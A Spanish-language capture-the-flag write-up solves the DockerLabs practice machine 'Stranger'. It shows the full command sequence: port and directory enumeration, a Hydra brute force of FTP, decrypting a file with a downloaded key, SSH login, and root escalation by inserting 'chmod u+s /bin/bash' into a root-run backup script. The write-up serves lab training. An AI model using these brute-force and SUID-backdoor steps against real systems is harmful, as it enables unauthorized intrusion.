# Máquina Stranger

Enlace a la máquina -> [Dockerlabs](https://mega.nz/file/VDtF0D4Q#NqCgaMcTlVPPm2FpUO3-0E50yxCzqpL2imaXpNIifpU)

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/6c5983bd-049a-4a6e-ad43-9dfa3fb1bfa3)

- **Nombre de la Máquina:** Stranger
- **Sistema Operativo:** Linux
- **Dificultad:** Medium
- **Plataforma:** DockerLabs
- **Dirección IP:** 172.17.0.2
- **Vulnerabilidades Explotadas:**
  - Fuerza bruta de credenciales FTP utilizando Hydra.
  - Desencriptación de archivo usando OpenSSL.
  - Manipulación de script de backup ejecutado por root.

## Reconocimiento y Enumeración

Comenzamos realizando un escaneo general con nmap sobre la IP de la máquina víctima para identificar los puertos abiertos.

```bash
sudo nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oN escaneo.txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/3b9e9779-436a-4c0e-bd98-5fe89714ce44)

Nos reporta los puertos 21, 22 y 80. Realizamos un escaneo más exhaustivo para ver qué servicios corren en cada puerto.

```bash
sudo nmap -p -p 21,22,80 -sCV 172.17.0.2 -oN targeted.txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/aeaa0e46-7aee-4b90-b7e8-121a713d61e6)

Como podemos extraer del reporte de nmap, disponemos de los servicios FTP, SSH y Apache.

En el puerto 80, vemos la página por defecto de Apache.

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/0a7eedef-66ff-4211-8d6d-16063f1e4fca)

Realizamos una búsqueda de directorios para encontrar elementos interesantes y hallamos un `index.html` y un directorio `/strange`. En `index.html` encontramos un posible nombre de usuario: **mwheeler**.

```bash
sudo gobuster dir -u 'http://172.17.0.2/' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/230abae8-54aa-4668-bb54-76292ada4d4d)
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/f1f0cc27-d4a0-4e09-856b-dcc9d4ef2105)

Continuamos investigando el directorio `/strange` sin encontrar nada relevante.

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/f365c091-aaf4-43eb-84a8-1905b59e7afc)

Procedemos a buscar archivos o más directorios dentro de `/strange` y encontramos dos elementos interesantes: `secret.html` y `private.txt`.

```bash
sudo gobuster dir -u 'http://172.17.0.2/strange' -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php,html,txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/e24e320f-723c-475a-b7db-25c031e12230)

En `secret.html` encontramos un mensaje que indica que el usuario **admin** corresponde al FTP y que la contraseña debe encontrarse mediante fuerza bruta, sugiriendo el uso de Hydra.

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/90388f49-1486-4d3c-a7ba-0620464c41f8)

El archivo `private.txt` parece estar encriptado, ya que el comando `file` no lo reporta como ASCII, sino como datos.

```bash
file private.txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/250b9e27-b8b6-4802-b1bf-c902671b6c67)

## Fuerza Bruta con Hydra

Para realizar el ataque de fuerza bruta, utilizamos el siguiente comando con el diccionario rockyou:

```bash
hydra -l "admin" -P /usr/share/wordlists/rockyou.txt 172.17.0.2 ftp -t 64
```

Nos encuentra la contraseña:
- **Nombre:** admin
- **Contraseña:** banana

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/88b89ed1-7b76-44bf-b4f3-44408c61ea94)

## FTP

Iniciamos sesión en el FTP con las credenciales descubiertas y vemos un archivo llamado `private_key.pem`. Lo descargamos para investigarlo.

```bash
ftp 172.17.0.2
admin
banana
get private_key.pem
exit
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/92ef8c51-a378-42b8-a058-1a48b320982c)

## Desencriptar con OpenSSL

Tenemos un archivo `.pem` y un texto cifrado dentro de `private.txt`. Para desencriptarlo, usamos el siguiente comando de OpenSSL:

```bash
openssl pkeyutl -decrypt -inkey private_key.pem -in private.txt -out privateOUT.txt
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/09a364f7-6257-4530-bb12-c1518af96e44)

La clave desencriptada es **demogorgon**.

## Intrusión vía SSH

Con el usuario (**mwheeler**) y la posible contraseña (**demogorgon**), intentamos acceder vía SSH a la máquina víctima.

```bash
ssh mwheeler@172.17.0.2
demogorgon
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/dd6e0a2d-a1ec-46a6-80cd-b0cc5974946c)

## Escalada de Privilegios

Una vez dentro, intentamos buscar maneras de escalar privilegios a root. Al ejecutar `sudo -l`, vemos que no tenemos permisos sudo. Intentamos buscar binarios con permisos SUID sin éxito. Enumerando el sistema, notamos que **root** ejecuta un script en bash cada cierto tiempo.

```bash
ps -aux
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/b35e7f0f-f8af-4c28-8c85-b92a3ff31530)

Verificamos que tenemos permisos de escritura en el script específico.

```bash
ls -l /usr/local/bin/
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/7d371e06-3e58-4330-a2b4-f7afdfbdbb9f)

Añadimos el comando `chmod u+s /bin/bash` al script para que cuando root lo ejecute, nos proporcione permisos SUID en bash.

```bash
vim /usr/local/bin/backup.sh
chmod u+s /bin/bash
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/c6ce1e63-4bbd-4ca0-8d51-cc45f3f98d46)
![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/3ea6cedc-6ffc-4ad1-a707-e2a53edb7814)

Finalmente, elevamos nuestros privilegios a root ejecutando el siguiente comando:

```bash
bash -p
```

![imagen](https://github.com/torralvoPrueba/Writeups_Hacking/assets/102786092/5a872791-28da-43a5-abfa-93aff8e11e01)

¡Y hemos finalizado la máquina, incluyendo la captura de la flag!
